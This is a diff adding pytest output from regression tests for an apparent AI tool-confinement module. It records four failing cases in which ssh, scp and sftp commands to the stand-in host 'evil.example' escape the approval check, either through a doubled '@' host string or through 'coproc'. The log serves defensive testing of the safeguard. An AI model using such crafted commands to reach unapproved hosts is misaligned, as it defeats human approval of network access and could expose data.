@@ -1,0 +1,52 @@
+FFFF                                                                     [100%]
+=================================== FAILURES ===================================
+_ test_ssh_real_target_requires_approval[ssh -F none foo@approved@evil.example] _
+/evidence/round9_regressions.py:14: in test_ssh_real_target_requires_approval
+    assert hosts=={'evil.example'} and not dynamic
+E   AssertionError: assert ({'approved@evil.example'} == {'evil.example'}
+E     
+E     Extra items in the left set:
+E     'approved@evil.example'
+E     Extra items in the right set:
+E     'evil.example'
+E     Use -v to get more diff)
+_ test_ssh_real_target_requires_approval[scp -F none file foo@approved@evil.example:/file] _
+/evidence/round9_regressions.py:14: in test_ssh_real_target_requires_approval
+    assert hosts=={'evil.example'} and not dynamic
+E   AssertionError: assert ({'approved@evil.example'} == {'evil.example'}
+E     
+E     Extra items in the left set:
+E     'approved@evil.example'
+E     Extra items in the right set:
+E     'evil.example'
+E     Use -v to get more diff)
+_ test_ssh_real_target_requires_approval[sftp -F none foo@approved@evil.example] _
+/evidence/round9_regressions.py:14: in test_ssh_real_target_requires_approval
+    assert hosts=={'evil.example'} and not dynamic
+E   AssertionError: assert ({'approved@evil.example'} == {'evil.example'}
+E     
+E     Extra items in the left set:
+E     'approved@evil.example'
+E     Extra items in the right set:
+E     'evil.example'
+E     Use -v to get more diff)
+___ test_ssh_real_target_requires_approval[coproc ssh -F none evil.example] ____
+/evidence/round9_regressions.py:14: in test_ssh_real_target_requires_approval
+    assert hosts=={'evil.example'} and not dynamic
+E   AssertionError: assert (set() == {'evil.example'}
+E     
+E     Extra items in the right set:
+E     'evil.example'
+E     Use -v to get more diff)
+=============================== warnings summary ===============================
+round9_regressions.py::test_ssh_real_target_requires_approval[ssh -F none foo@approved@evil.example]
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round9_regressions.py::test_ssh_real_target_requires_approval[ssh -F none foo@approved@evil.example]
+FAILED ../evidence/round9_regressions.py::test_ssh_real_target_requires_approval[scp -F none file foo@approved@evil.example:/file]
+FAILED ../evidence/round9_regressions.py::test_ssh_real_target_requires_approval[sftp -F none foo@approved@evil.example]
+FAILED ../evidence/round9_regressions.py::test_ssh_real_target_requires_approval[coproc ssh -F none evil.example]
+4 failed, 1 warning in 0.11s
